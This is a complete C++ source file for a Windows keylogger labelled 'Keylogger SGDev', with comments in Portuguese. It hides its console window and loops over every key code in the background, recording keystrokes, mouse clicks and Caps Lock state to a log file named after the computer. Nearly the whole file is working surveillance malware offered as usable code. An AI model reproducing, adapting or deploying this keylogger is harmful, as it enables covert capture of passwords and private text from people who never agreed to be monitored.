//Keylogger SGDev
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>

using namespace std;

bool isCapsON = false;//Verificador de capslock

template <class Text>//Passa por string e char

//Inserir, Reescrever e Limpar o arquivo de log
void appendKeyLog(Text key, string hostName){
	ofstream logfile;
	logfile.open((hostName + ".txt"), ios::app);
	logfile << key;
	logfile.close();
}
template <class Text>
void rewriteLog(Text& newText, string hostName){
	ofstream logfile;
	logfile.open((hostName + ".txt"));
	logfile.clear();
	logfile << newText;
	logfile.close();
}

//Verifica��o de bot�es pressionados
bool isKeyPressed(byte key){
	return GetAsyncKeyState(key) == (short)0x8001;//Verifica se um bot�o est� sendo pressionado
}
bool isShiftHelded(){
	return GetAsyncKeyState(VK_SHIFT) && (short)-1;//Verifica se o shift est� sendo pressionado (para inserir caracteres especiais)
}

//Leitura de arquivo
void readFile(string& newText, string hostName){
	ifstream logfile;
	logfile.open((hostName + ".txt"));
	string temp;
	while(logfile.good()){//Itera dentro do log atual
		getline(logfile, temp);
		newText += (temp + "\n");//Acrescenta
	}
	if(newText.length() >=2){//Verifica se o novo texto n�o � vazio antes de de come�ar a deletar
		for(int k = 0; k < 2; k++){
			newText.pop_back();//Deleta o �ltimo caractere da linha e o caractere anterior a ele
		}
	}
}

//Teclas especiais
bool isKeyListed(byte key, string hostName){
	switch(key){
		case VK_LBUTTON:
			appendKeyLog("[L-Mouse]", hostName);
			break;
		case VK_RBUTTON:
			appendKeyLog("[R-Mouse]", hostName);
			break;
		case VK_CAPITAL:
			//Bloco case alterado em 03/12/2019
			isCapsON = !isCapsON;
			if(isCapsON == 1){
				appendKeyLog("[CapsOn]", hostName);
			}else{
				appendKeyLog("[CapsOff]", hostName);
			}
			break;
		case VK_SPACE:
			appendKeyLog(" ", hostName);
			break;
		case VK_RETURN:
			appendKeyLog("\n", hostName);
			break;
		case VK_OEM_PERIOD:
			appendKeyLog(".", hostName);
			break;
		case VK_TAB:
			appendKeyLog("[TAB]", hostName);
			break;
		case VK_CONTROL:
			appendKeyLog("[CTRL]", hostName);
			break;
		case VK_BACK:
			appendKeyLog("[BACKSPACE]", hostName);
			break;
		case VK_MENU:
			appendKeyLog("[ALT]", hostName);
			break;
		default: return false;//Caso nenhum destes bot�es seja pressionado, retorna false
	}
	return true;//Caso contr�rio, retorna true
}

//Caracteres
bool isKeyAlphabet(byte vKey){
	return (65 <= vKey) && (vKey <= 90);
}
bool isKeyNumeric(byte vKey){
	return (48 <= vKey) && (vKey <= 57);
}

//Caracteres especiais
void getSymbol(const byte& numeric, byte& symbol){
	switch(numeric){
		case '1':
			symbol = '!';
			break;
		case '2':
			symbol = '@';
			break;
		case '3':
			symbol = '#';
			break;
		case '4':
			symbol = '$';
			break;
		case '5':
			symbol = '%';
			break;
		case '6':
			symbol = '�';
			break;
		case '7':
			symbol = '&';
			break;
		case '8':
			symbol = '*';
			break;
		case '9':
			symbol = '(';
			break;
		case '0':
			symbol = ')';
			break;
	}
}

//Main Func
int main(){
	FreeConsole();//Oculta o console para o modo segundo plano

	byte key;
	
	string hostName = getenv("COMPUTERNAME");
	
	appendKeyLog((hostName + "\n\n"), hostName);
	
	while(true){
		for(key = 8; key <= 255; key++){
			if(isKeyPressed(key)){
				if(!isKeyListed(key, hostName)){
					if(isKeyAlphabet(key)){
						if(isShiftHelded()){
							if(!isCapsON){
								appendKeyLog(key, hostName);//Caps por padr�o, quando caps n�o est� ativo
							}else{
								appendKeyLog((byte)(key + 32), hostName);//Uppercase char + 32 � lowercase em ascii
							}
						}
						else{
							if(!isCapsON){
								appendKeyLog((byte)(key + 32), hostName);//Uppercase char + 32 � lowercase em ascii
							}else{
								appendKeyLog(key, hostName);//Caps por padr�o, quando caps n�o est� ativo
							}
						}
					}else if(isKeyNumeric(key)){
                        if(isShiftHelded()){
                            byte symbol;
                            getSymbol(key, symbol);
                            appendKeyLog(symbol, hostName);
                        }else{
                            appendKeyLog(key, hostName);
                        }
                    }
                }
            }
        }
    }
	return 0;
}
